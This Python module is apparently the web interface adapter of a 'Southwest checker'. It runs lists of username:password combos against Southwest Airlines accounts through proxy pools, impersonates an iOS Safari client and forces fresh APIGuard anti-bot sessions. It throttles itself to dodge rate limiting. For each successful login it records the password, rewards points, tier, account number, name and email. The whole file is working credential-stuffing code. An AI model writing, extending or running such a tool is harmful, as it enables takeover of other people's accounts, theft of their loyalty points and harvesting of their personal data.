"""Web UI adapter for the Southwest checker worker."""

from __future__ import annotations

import json
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from southwest_checker.checker import CheckResult, SouthwestChecker, parse_combo
from southwest_checker.proxy import parse_proxy

_UNSET = object()


@dataclass
class JobSettings:
    full_bootstrap: bool = True
    auto_sensors: bool = False
    capture_data: dict[str, Any] | None = None
    impersonate: str = "safari17_2_ios"
    request_delay: float = 0.35
    max_check_retries: int = 2


_job_settings = JobSettings()
_settings_lock = threading.Lock()
_pool_lock = threading.Lock()
_checkers: dict[str, tuple[SouthwestChecker, threading.Lock]] = {}
_backoff_lock = threading.Lock()
_backoff_until = 0.0
_consecutive_429 = 0


def set_job_settings(
    *,
    full_bootstrap: bool = True,
    auto_sensors: bool = False,
    capture_data: dict[str, Any] | None = None,
    request_delay: float | None = None,
    max_check_retries: int | None = None,
) -> None:
    with _settings_lock:
        _job_settings.full_bootstrap = full_bootstrap
        _job_settings.auto_sensors = auto_sensors
        _job_settings.capture_data = capture_data
        if request_delay is not None:
            _job_settings.request_delay = max(0.0, float(request_delay))
        if max_check_retries is not None:
            _job_settings.max_check_retries = max(0, int(max_check_retries))


def get_job_settings() -> JobSettings:
    with _settings_lock:
        return JobSettings(
            full_bootstrap=_job_settings.full_bootstrap,
            auto_sensors=_job_settings.auto_sensors,
            capture_data=_job_settings.capture_data,
            request_delay=_job_settings.request_delay,
            max_check_retries=_job_settings.max_check_retries,
        )


def reset_runtime_state() -> None:
    """Clear shared checker pool and backoff state between jobs."""
    global _consecutive_429, _backoff_until
    with _pool_lock:
        _checkers.clear()
    with _backoff_lock:
        _consecutive_429 = 0
        _backoff_until = 0.0


def load_capture_config(path: Path) -> dict[str, Any] | None:
    if not path.exists():
        return None
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError):
        return None


@dataclass
class WebCheckResult:
    status: str
    username: str
    password: str
    line: str = ""
    data: dict[str, Any] = field(default_factory=dict)

    def format_line(self) -> str:
        return self.line

    def to_data(self) -> dict[str, Any]:
        return self.data


def _status_label(result: CheckResult) -> str:
    return {
        "hit": "HIT",
        "bad": "BAD",
        "retry": "RETRY",
        "error": "ERROR",
    }.get(result.status, "ERROR")


def _format_hit_line(username: str, password: str, result: CheckResult) -> str:
    name = " ".join(filter(None, [result.first_name, result.last_name]))
    points = result.redeemable_points if result.redeemable_points is not None else 0
    return (
        f"{username}:{password} | {points:,} pts | {result.tier or '?'} | "
        f"Acct: {result.account_number or '?'} | {name} | {result.email or '?'}"
    )


def _to_web_result(username: str, password: str, result: CheckResult) -> WebCheckResult:
    status = _status_label(result)
    if result.status == "hit":
        line = _format_hit_line(username, password, result)
    else:
        line = result.summary()

    data = {
        "username": username,
        "password": password,
        "status": status,
        "redeemable_points": result.redeemable_points,
        "tier": result.tier,
        "account_number": result.account_number,
        "first_name": result.first_name,
        "last_name": result.last_name,
        "email": result.email,
        "error": result.error,
    }
    return WebCheckResult(status=status, username=username, password=password, line=line, data=data)


def _proxy_key(proxy: str | None) -> str:
    return proxy or "__direct__"


def _get_shared_checker(proxy: str | None) -> tuple[SouthwestChecker, threading.Lock]:
    key = _proxy_key(proxy)
    with _pool_lock:
        entry = _checkers.get(key)
        if entry is None:
            settings = get_job_settings()
            checker = SouthwestChecker(
                proxy=proxy,
                full_bootstrap=settings.full_bootstrap,
                auto_sensors=settings.auto_sensors,
                capture_data=settings.capture_data,
            )
            entry = (checker, threading.Lock())
            _checkers[key] = entry
        return entry


def _wait_for_backoff() -> None:
    with _backoff_lock:
        until = _backoff_until
    remaining = until - time.time()
    if remaining > 0:
        time.sleep(remaining)


def _note_result(result: CheckResult) -> None:
    global _consecutive_429, _backoff_until
    with _backoff_lock:
        if result.status == "retry":
            _consecutive_429 += 1
            pause = min(2.0 + _consecutive_429 * 1.5, 20.0)
            _backoff_until = max(_backoff_until, time.time() + pause)
        elif result.status in {"hit", "bad"}:
            _consecutive_429 = max(0, _consecutive_429 - 1)


def refresh_apiguard(proxy: str | None = None) -> None:
    """Force-refresh APIGuard session headers for one or all proxy pools."""
    with _pool_lock:
        targets = (
            [_checkers[_proxy_key(proxy)]]
            if proxy is not None and _proxy_key(proxy) in _checkers
            else list(_checkers.values())
        )
    for checker, lock in targets:
        with lock:
            if checker._apiguard:
                checker._apiguard.session = None
                checker._apiguard.refresh_if_needed(force=True)


def prewarm_apiguard(proxies: list[str]) -> None:
    """Bootstrap APIGuard once per proxy before bulk checking."""
    targets = proxies or [None]
    seen: set[str] = set()
    for proxy in targets:
        key = _proxy_key(proxy)
        if key in seen:
            continue
        seen.add(key)
        checker, lock = _get_shared_checker(proxy)
        with lock:
            if checker._apiguard and not checker._apiguard.session:
                checker._apiguard.init()


def parse_proxy_lines(lines: list[str]) -> tuple[list[str], list[str]]:
    valid: list[str] = []
    invalid: list[str] = []
    for line in lines:
        raw = line.strip()
        if not raw or raw.startswith("#"):
            continue
        try:
            valid.append(parse_proxy(raw))
        except ValueError:
            invalid.append(raw)
    return valid, invalid


def check_account(
    username: str,
    password: str,
    *,
    proxy: Any = _UNSET,
    timeout: int = 45,
) -> WebCheckResult:
    del timeout
    settings = get_job_settings()
    proxy_url = None if proxy is _UNSET else proxy
    _wait_for_backoff()

    if settings.request_delay > 0:
        time.sleep(settings.request_delay)

    checker, lock = _get_shared_checker(proxy_url)
    with lock:
        result = checker.check(username, password, retries=settings.max_check_retries)

    _note_result(result)
    return _to_web_result(username, password, result)
